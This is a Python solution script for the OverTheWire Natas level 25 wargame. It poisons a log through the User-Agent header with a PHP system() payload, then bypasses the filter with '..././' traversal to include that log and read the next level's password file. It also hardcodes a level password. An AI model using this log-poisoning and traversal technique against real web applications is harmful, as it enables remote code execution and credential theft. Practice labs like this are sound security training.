import requests

import natas24
from helpers import between


def solution(password: str = None, cheat: bool = False) -> str:
    if cheat:
        return "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"
    url = "http://natas25.natas.labs.overthewire.org"
    username = "natas25"
    if not password:
        password = natas24.solution(cheat=True)

    # The source code shows that the app logs the user agent and has a
    # weak directory traversal countermeasure.

    s = requests.Session()
    auth = (username, password)
    user_agent = "<?php system('cat /etc/natas_webpass/natas26');?>"
    s.headers.update({"User-Agent": user_agent})
    s.get(url, auth=auth)
    session_id = s.cookies.get("PHPSESSID")
    file_path = (
        "..././..././..././..././.../."
        "/var/www/natas/natas25/logs/"
        "natas25_{session_id}.log"
    ).format(session_id=session_id)
    params = {"lang": file_path}
    r = s.get(url, auth=auth, params=params)
    start = "] "
    end = '\n "Directory traversal attempt!'
    natas26_password = between(r.text, start, end)
    return natas26_password
